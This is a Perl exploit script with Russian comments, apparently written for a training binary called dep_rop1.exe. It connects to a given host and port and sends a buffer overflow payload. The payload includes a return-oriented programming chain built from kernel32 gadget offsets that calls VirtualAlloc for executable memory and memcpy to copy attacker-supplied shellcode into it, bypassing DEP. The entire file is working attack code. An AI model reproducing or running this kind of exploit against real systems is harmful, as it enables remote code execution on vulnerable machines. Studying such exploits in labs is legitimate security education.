#!/usr/bin/perl -w

# Эксплоит для программы dep_rop1.exe
# 28.10.2016

use IO::Socket;

my $host = shift @ARGV;
my $port = shift @ARGV;
my $sc_file = shift @ARGV;

my $sock = IO::Socket::INET->new ("$host:$port") or die $@;
$sock->autoflush(1);

my $sc = `cat $sc_file`;
my $sc_len = length ($sc);


my $base_exe = 0x08040000;
my $base_kernel32 = 0x76b50000;
my $base_ntdll = 0x7c900000;
#my $base_advapi = 0x00;


#my $pop_ecx = $base_exe + 0x1494;
my $pop_ecx_ebx_retn4 = $base_kernel32 + 0x00068b8f;
#my $pop_esi = $base_exe + 0x1758;
my $pop_esi = $base_kernel32 + 0x0004d520;

#my $pop_edi_esi_ebx_ebp = $base_exe + 0x181f;

#my $pop_edx = $base_ntdll + 0x13c3;
my $pop_edx = $base_kernel32 + 0x000b7170;
#my $pop_eax = $base_kernel32 + 0x105df0;
my $pop_eax_retn8 = $base_kernel32 + 0x000a6e14;
#my $pop_ebp = $base_exe + 0x18eb;
my $pop_ebp_retn4 = $base_kernel32 + 0x00085b56;
#my $pop_edi = $base_ntdll + 0x28CB;
my $pop_edi_esi_ebp = $base_kernel32 + 0x00068a11;
my $pop_ebx = $base_kernel32 + 0x0006899a;

#------for save eax--------------

# MOV DWORD PTR DS:[EDX],EAX # MOV EAX,3 # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
#my $mov_memedx_eax = $base_ntdll + 0x3821;

# MOV DWORD PTR DS:[ECX],EAX # ADD CL,CH # RETN 
my $mov_memecx_eax = $base_kernel32 + 0x3B696;

# адрес для сохранения eax
my $save_addr = $base_exe + 0x40E0;

#my $ret = $base_exe + 0x10E8;
my $ret = $base_kernel32 + 0x0006899b;

#my $rop_save_addr = pack ("L", $pop_edx) . pack ("L", $save_addr) . pack ("L", $mov_memedx_eax) . pack ("L", $ret) . "A"x(0x10);
my $rop_save_addr = pack("L", $pop_ecx_ebx_retn4) . pack("L", $save_addr) . pack("L", 0x01010101) . pack("L", $mov_memecx_eax) . "A"x(0x4) . pack("L", $ret);

#---------for virtual_alloc----------

my $iat_virtual_alloc = $base_exe + 0x51d8;
my $iat_memcpy = $base_exe + 0x52A0;

my $size_sc = 0x1000;
my $allocation_type = 0x3000;
my $protect_rwx = 0x40;

my $addr_for_copy_sc = 0x66660000;

# MOV EAX,DWORD PTR DS:[EAX+34] # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
#my $mov_eax_mem_eax34 = $base_ntdll + 0x10337;

# push eax # ret
#my $push_eax_ret = $base_ntdll + 0x1A1C;

# 0x76bd5667 :  # MOV EAX,DWORD PTR DS:[EAX+1D0] # RETN 
my $mov_eax_mem_eax1D0 = $base_kernel32 + 0x85667;

# XCHG EAX,ECX # RETN
my $xchg_eax_ecx = $base_kernel32 + 0x000402f5;

# PUSH ECX # RETN 
my $push_ecx_ret = $base_kernel32 + 0x4BDC7;

# my $rop_virtual_alloc = pack ("L", $pop_eax) . pack ("L", $iat_virtual_alloc - 0x34) . pack ("L", $mov_eax_mem_eax34) .
	# pack ("L", $push_eax_ret) . pack ("L", $ret) . pack ("L", $addr_for_copy_sc) . pack ("L", $size_sc) . pack ("L", $allocation_type) . pack ("L", $protect_rwx);
my $rop_virtual_alloc = 
	pack("L", $pop_eax_retn8) . pack("L", $iat_virtual_alloc - 0x1D0) . pack("L", $mov_eax_mem_eax1D0) . "A"x(0x8) .
	pack("L", $xchg_eax_ecx) .	pack("L", $push_ecx_ret) . 
	pack("L", $ret) . pack ("L", $addr_for_copy_sc) . pack ("L", $size_sc) . pack ("L", $allocation_type) . pack ("L", $protect_rwx);

#--------------for memcpy--------------

# pushad # ret
# pushad: АХ/ЕАХ, СХ/ЕСХ, DX/EDX, ВХ/ЕВХ, SP/ESP, BP/EBP, SI/ESI, DI/EDI 
# my $pushad_ret = $base_ntdll + 0x2751b;
my $pushad_ret = $base_kernel32 + 0x0002e180;

# MOV EBX,DWORD PTR SS:[EBP-30] # NOP # NOP # NOP # NOP # NOP # MOV BYTE PTR DS:[ESI+45],0 # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
#my $mov_ebx_ebp30 = $base_ntdll + 0x531a5;

# retn 8
#my $ret8 = $base_ntdll + 0x11F2;

# 76C01E3B 0xB1E3B  RETN 8
my $retn8 = $base_kernel32 + 0xB1E3B;


#0x76b8d465 (RVA : 0x0003d465) : # XCHG EAX,EBX # RETN 0x02  
my $xchg_eax_ebx_retn2 = $base_kernel32 + 0x0003d465;

# edi = retn 8
# esi = ret
# ebx = memcpy
# edx = ret_addr = addr_for_copy_sc
# ecx = addr_for_copy_sc
# eax = sc = *save_addr

my $rop_memcpy = 
	# edx = addr_for_copy_sc
	pack("L", $pop_edx) . pack ("L", $addr_for_copy_sc) .
	# ecx = addr_for_copy_sc
	pack("L", $pop_ecx_ebx_retn4) . pack ("L", $addr_for_copy_sc) . pack("L", 0x01010101) . pack("L", $ret) . "A"x(0x4) .
	# ebx = memcpy
	pack("L", $pop_eax_retn8) . pack("L", $iat_memcpy - 0x1D0) . pack("L", $mov_eax_mem_eax1D0) . "A"x(0x8) . pack("L", $xchg_eax_ebx_retn2) . pack("L", $ret) . "A"x(0x2) .
	# eax = *save_addr
	pack("L", $pop_eax_retn8) . pack("L", $save_addr - 0x1D0) . pack("L", $mov_eax_mem_eax1D0) . "A"x(0x8) .
	# edi = retn 8 ; esi = ret ; ebp = 0x01010101;
	pack("L", $pop_edi_esi_ebp) . pack("L", $retn8) . pack("L", $ret) . pack("L", 0x01010101) .
	pack("L", $pushad_ret) . pack ("L", $size_sc);
	

# my $rop_memcpy = 
# pack ("L", $pop_ebp) . pack ("L", $iat_memcpy + 0x30) . pack ("L", $pop_esi) . pack ("L", $save_addr) . pack ("L", $mov_ebx_ebp30) .
# pack ("L", $pop_eax) . pack ("L", $save_addr - 0x34) . pack ("L", $mov_eax_mem_eax34) .
# pack ("L", $pop_edi) . pack ("L", $ret8) .
# pack ("L", $pop_esi) . pack ("L", $ret) .
# pack ("L", $pop_edx) . pack ("L", $addr_for_copy_sc) .
# pack ("L", $pop_ecx) . pack ("L", $addr_for_copy_sc) .
# pack ("L", $pushad_ret) . pack ("L", $size_sc);





my $rop = $rop_save_addr . $rop_virtual_alloc . $rop_memcpy;
my $data = $sc . "A"x(1004-$sc_len) . "\xf3" . $rop . "\n";
print $sock $data;

$sock->close();
